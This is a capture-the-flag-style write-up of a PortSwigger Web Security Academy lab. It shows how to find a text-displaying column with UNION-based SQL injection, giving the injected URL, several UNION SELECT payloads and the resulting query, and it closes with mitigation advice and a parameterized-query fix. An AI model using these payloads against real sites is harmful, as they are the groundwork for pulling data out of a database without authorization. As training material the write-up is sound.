# SQL Injection UNION Attack - Finding a Text Column

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Identify which column in the database query can display text data by making a specific string appear on the webpage using a UNION-based SQL injection.

---

## Vulnerability

The application remains vulnerable to UNION-based SQL injection. After determining the query returns 3 columns (from Lab 3), we now need to find which column(s) accept and display string data.

**Backend Query Structure:**
```sql
SELECT column1, column2, column3 FROM products WHERE category = 'USER_INPUT'
```

**Developer Mistake:**  
- **No input sanitization** allowing UNION injection
- **Direct output of query results** to the webpage without validation
- **No content filtering** on displayed columns
- **Predictable query structure** making exploitation straightforward

Not all columns may accept string data — some might be integers, dates, or other types. Finding text-compatible columns is crucial for extracting meaningful data.

---

## Understanding Column Data Types

### Why This Matters:
- **Integer columns** can't display strings like 'administrator'
- **Date columns** expect specific formats
- **Text/VARCHAR columns** accept and display strings
- We need to find which column renders on the page AND accepts text

### The Test String:
PortSwigger provides a unique string (in my case: `IKLErl`) that must appear on the page to solve the lab. This proves:
1. The column accepts text data
2. The column's output is rendered on the webpage
3. We've successfully injected data into visible output

---

## Steps

1. **Started with knowledge from Lab 3**
   - Confirmed the query has **3 columns**
   - Base payload: `' UNION SELECT NULL,NULL,NULL--`

2. **Tested column 1 for text compatibility**
   - Payload: `' UNION SELECT 'IKLErl',NULL,NULL--`
   - Result: ❌ Error or no visible output

3. **Tested column 2 for text compatibility**
   - Payload: `' UNION SELECT NULL,'IKLErl',NULL--`
   - Result: ✅ Success! String appeared on the page

4. **Confirmed the finding**
   - **Column 2** accepts string data
   - **Column 2** is displayed on the webpage
   - Ready for data extraction attacks

---

## Payload

```sql
' UNION SELECT NULL,'IKLErl',NULL--
```

**Complete URL:**
```
/filter?category=Gifts' UNION SELECT NULL,'IKLErl',NULL--
```

**Resulting SQL Query:**
```sql
SELECT column1, column2, column3 FROM products WHERE category = 'Gifts' 
UNION 
SELECT NULL,'IKLErl',NULL--'
```

**What happens:**
- `Gifts'` closes the category string
- `UNION SELECT NULL,'IKLErl',NULL` injects a row with the test string in column 2
- Column 2 is rendered on the webpage, displaying `IKLErl`
- `--` comments out trailing SQL
- Lab is solved when the string appears on the page

---

## Systematic Testing Approach

### Testing Each Column:
```sql
-- Test Column 1
' UNION SELECT 'IKLErl',NULL,NULL--     ❌ Failed

-- Test Column 2  
' UNION SELECT NULL,'IKLErl',NULL--     ✅ Success!

-- Test Column 3 (optional verification)
' UNION SELECT NULL,NULL,'IKLErl'--     ❌ Not needed
```

### Multiple Text Columns:
Some queries may have multiple text-compatible columns:
```sql
' UNION SELECT 'test1','test2','test3'--
```
This helps identify ALL usable columns for future exploitation.

---

## What I Learned

1. **Column enumeration is two-step:** first find the count, then find the types
2. **Not all columns are created equal** — data type compatibility matters
3. **NULL is for probing, strings are for confirming** text compatibility
4. **Visibility matters** — a column might accept text but not render on the page
5. **This enables targeted extraction** — now we know exactly where to inject data queries

---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) instead of string concatenation
- Implement **input validation** and whitelist allowed category values
- Apply **principle of least privilege** to database user accounts
- Never trust user input — always sanitize and validate

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, (user_input,))
```
